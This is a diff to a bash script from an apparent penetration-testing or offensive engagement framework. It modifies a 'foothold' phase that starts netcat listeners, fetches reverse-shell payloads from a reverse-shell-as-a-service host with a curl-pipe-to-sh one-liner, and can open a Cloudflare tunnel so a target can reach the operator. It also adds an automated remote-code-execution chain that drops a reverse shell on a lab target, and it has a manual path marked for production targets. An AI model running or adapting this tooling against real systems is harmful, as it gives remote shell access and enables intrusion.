@@ -1,7 +1,7 @@
 # shellcheck shell=bash
-# Phase 40 — foothold: reverse-shell-as-a-service (lukechilds) + nc listener
-# + optional Cloudflare Quick Tunnel so the target can reach the operator.
-# Requires ENGAGE_LHOST (operator-reachable IP) and ENGAGE_LPORT.
+# Phase 40 — foothold: listeners + optional Cloudflare tunnel; Lab-FPM: automated
+# Chain-A RCE → reverse shell into the nc listener (no manual payload copy).
+# Requires ENGAGE_LHOST (operator IP reachable from target).
 phase_foothold() {
   state_done 40 && { echo "[40] foothold ✓ (skip)"; return 0; }
   local lhost="${ENGAGE_LHOST:?ENGAGE_LHOST setzen (Operator-IP, vom Ziel erreichbar)}"
@@ -17,19 +17,16 @@ phase_foothold() {
   else
     state_set 40 RS_PAYLOAD "fetch-failed"
   fi
-  rs_oneliners "$lhost" "$lport" > "$paydir/oneliners.txt"
+  rs_oneliners "$lhost" "$lport" >"$paydir/oneliners.txt"
 
   local jobs=(
     "listener|echo '[listener] warte auf Rückkanal auf $lhost:$lport'; nc -lvnp $lport"
   )
-  # RAAS extra listener is ON by default (ENGAGE_RS=off to skip).
   if [[ "${ENGAGE_RS:-on}" != "off" ]]; then
     local rsport="${ENGAGE_RS_PORT:-4445}"
     jobs+=("rs-raas-$rsport|echo '[rs] lukechilds reverse-shell.sh — Listener $rsport (curl $(rs_url)/$lhost:$rsport | sh)'; nc -lvnp $rsport")
     state_set 40 RS_PORT "$rsport"
-    if rs_fetch_payload "$lhost" "$rsport" "$paydir/r-$rsport"; then
-      :
-    fi
+    rs_fetch_payload "$lhost" "$rsport" "$paydir/r-$rsport" || true
   fi
 
   if [[ "${ENGAGE_TUNNEL:-}" == "on" ]]; then
@@ -39,7 +36,7 @@ phase_foothold() {
     elif command -v docker >/dev/null 2>&1; then
       jobs+=("cf-tunnel|echo '[tunnel] docker cloudflared → $turl'; docker run --rm --network host cloudflare/cloudflared:latest tunnel --no-autoupdate --url $turl")
     else
-      echo "[40] WARN: ENGAGE_TUNNEL=on aber weder cloudflared noch docker — skip" | tee -a "$ENGAGE_DIR/logs/40-tunnel.warn"
+      echo "[40] WARN: ENGAGE_TUNNEL=on aber weder cloudflared noch docker" | tee -a "$ENGAGE_DIR/logs/40-tunnel.warn"
     fi
     state_set 40 TUNNEL "on"
   else
@@ -47,18 +44,37 @@ phase_foothold() {
   fi
 
   term_spawn_jobs "$sid" "$ENGAGE_DIR/logs" "${jobs[@]}"
+  sleep 2
 
   state_set 40 LISTEN_HOST "$lhost"
   state_set 40 LISTEN_PORT "$lport"
   state_set 40 TERM_SESSION "$sid"
+
+  local fh="listener-only"
+  if [[ "${ENGAGE_LAB_FOOTHOLD:-auto}" != "off" ]] && engage_lab_foothold_supported; then
+    local fh_log="$ENGAGE_DIR/logs/40-foothold-lab.log"
+    echo "[40] Lab-Foothold: Chain-A RCE → nc $lhost:$lport …" | tee "$fh_log"
+    if engage_lab_foothold_exec_rce "$lhost" "$lport" >>"$fh_log" 2>&1; then
+      fh="lab-rce-nc"
+      state_set 40 LAB_FOOTHOLD "ok"
+    else
+      state_set 40 LAB_FOOTHOLD "failed"
+      echo "[40] Lab-Foothold fehlgeschlagen — siehe $fh_log" >&2
+    fi
+    engage_lab_foothold_note | tee -a "$fh_log"
+  elif engage_target_is_lab; then
+    echo "[40] Lab-Ziel, aber FPM-Container/Docker nicht bereit — nur Listener+Payloads" >&2
+    state_set 40 LAB_FOOTHOLD "skipped-no-target"
+  else
+    state_set 40 LAB_FOOTHOLD "prod-manual"
+  fi
+
+  state_set 30 FOOTHOLD "$fh"
   state_mark 40
 
   cat <<EOF
-[40] foothold ✓ Listener läuft (Session: $sid, Port $lport)
-     RAAS-Payloads: $paydir/oneliners.txt
-     lukechilds:    curl -fsSL '$(rs_url)/$lhost:$lport' | sh
-
-Payloads (Ziel-OS):
-$(cat "$paydir/oneliners.txt")
+[40] foothold ✓ Listener: $lhost:$lport (tmux $sid, Fenster listener)
+     Lab-RCE-Foothold: $(state_get 40 LAB_FOOTHOLD)
+     Payloads (manuelle Referenz): $paydir/oneliners.txt
 EOF
 }
